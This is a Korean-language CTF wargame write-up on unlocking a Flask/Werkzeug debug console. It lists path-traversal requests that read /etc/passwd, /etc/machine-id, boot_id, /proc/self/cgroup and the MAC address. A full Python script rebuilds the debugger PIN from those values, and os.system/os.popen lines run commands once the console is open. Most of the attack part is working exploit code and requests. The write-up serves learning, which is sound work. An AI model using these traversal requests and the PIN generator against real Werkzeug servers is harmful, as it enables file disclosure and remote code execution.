핵심은 해당 PIN 번호를 어떻게 얻을 것이냐 이다 
그 번호를 얻어서 /console에 친 후에는 
import os 
os.system('/flag')

f = os.popen('/flag')
print(f.read()) 
와 같은 기본적인 명령어로도 원하는 값을 얻을 수 있다 
(심지어 어떤 ctf에서는 /console로 들어가서 위와 비슷한 명령어를 치는 것만으로도 
flag가 나오는 곳도 있었다 다만 이 문제는 좀 더 심화해서 원하는 pin번호를 맞추는 것을 조건으로
제시하고 있다) 
이렇게 풀 수 있는 이유는 flask의 경우 서버에 오류가 생기면 /console을 통해서 
명령어를 입력할 수 있도록 구성되어 있기 때문이다 
다만 그걸 인증하는 차원에서 PIN번호를 입력하는 것으로 보인다 

/../../usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py HTTP/1.1
-> 프로그램 구성 원리 PIN 번호 생성 소스코드 

/../../etc/passwd HTTP/1.1
-> 패스워드

/../../sys/class/net/eth0/address HTTP/1.1
->mac 주소 

/../../etc/machine-id HTTP/1.1
-> id

/../../proc/sys/kernel/random/boot_id HTTP/1.1
-> spare

/../../proc/self/cgroup HTTP/1.1
->id 덧붙임  (python 3.8 레퍼런스)


94-E7-0B-3D-ED-89
163720046964105 (내 꺼 mac 주소 int 형 변환?)
위의 내용들은 간단한 LFI 취약점임을 금방 알 수 있다 
--> 내 mac주소는 필요 없었따 ㅠㅜ

python 3.8의 레퍼런스에 따르면 
pin번호를 알 수 있는 조건 중에 
아주 간단하게 말하면 (/etc/machine-id 파일 값 or /proc/sys/kernel/random/boot_id 파일 값) 
+ /proc/self/cgroup 파일 값이 return 값이다.
이 조건이 있다 
따라서 위에서 구한 것을 잘 합쳐서 pin 번호 조건을 구성해야 하는 것이다 

/proc/self/cgroup 파일 값은 13:pids:/libpod_parent/libpod-e2e2f42575a3bfccea6451c9cd
e80f03574326f98ef0a7b8d64a7e949eea285d으로 되어있는데 rpartition 함수를 이용하여 
libpod-e2e2f42575a3bfccea6451c9cde80f03574326f98ef0a7b8d64a7e949eea285d을 추출하는 것이다.
 (이 값은 계속 달라진다)
나는 구해보니깐, b"c31eea55a29431535ff01de94bdcf5cflibpod-e2e2f42575a3bfccea6451c9cde8
0f03574326f98ef0a7b8d64a7e949eea285d"으로 나온다. 이를 토대로 PIN를 구해봤다.
---> 그러니까 나는 libpod값만 달라지는 줄 알고 이거만 변수로 입력한 건데 
자세히 관찰해보니 mac주소 역시 계속 변환된다는 것을 알 수 있었다 
 

import hashlib
from itertools import chain

probably_public_bits = [
    "dreamhack",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    "163720046964105",  # MAC 주소 16진수 -> int (내 맥주소가 아니라 해당 워게임)
    "c31eea55a29431535ff01de94bdcf5cflibpod-4f1f7ca316b405b14b371e1105f17e70293098295e5f25bcd0531cd59f9a34aa",
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)


마지막 key는 역시 MAC주소 였다 ㅠㅜ 
해당 워게임 LFI 취약점을 이용해서 mac 주소가 나오는데 
그걸 int형으로 바꾸어서 입력하면 된다 (python interpreter로 변환시켰다)
